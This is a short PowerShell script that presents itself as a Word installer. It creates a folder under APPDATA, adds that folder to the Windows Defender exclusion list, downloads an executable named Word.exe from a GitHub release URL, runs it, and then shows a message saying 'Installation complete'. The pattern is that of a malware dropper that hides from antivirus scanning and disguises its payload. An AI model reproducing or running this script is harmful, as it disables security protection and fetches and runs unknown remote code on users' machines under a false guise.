# Load shits
Add-Type -AssemblyName System.Windows.Forms

# Set up the folder path
$folderPath = Join-Path -Path $env:APPDATA -ChildPath "word"

# Create folder if !exist
if (!(Test-Path -Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
    Write-Output "Created folder: $folderPath"
} else {
    Write-Output "Folder already exists: $folderPath"
}

# Add the folder to Windows Defender's exclusion list
Add-MpPreference -ExclusionPath $folderPath
Write-Output "Whitelist complete."

# Define the download URL and destination path
$url = "https://github.com/jstankovic2/fade_urls/releases/download/dddd/Word.exe"
$destination = Join-Path -Path $folderPath -ChildPath "Word.exe"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination
Write-Output "Download complete."

# Run the downloaded executable
Start-Process -FilePath $destination
Write-Output "Executable started."

# Display the completion message
[System.Windows.Forms.MessageBox]::Show("Installation complete. You can close this window.", "Installation Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
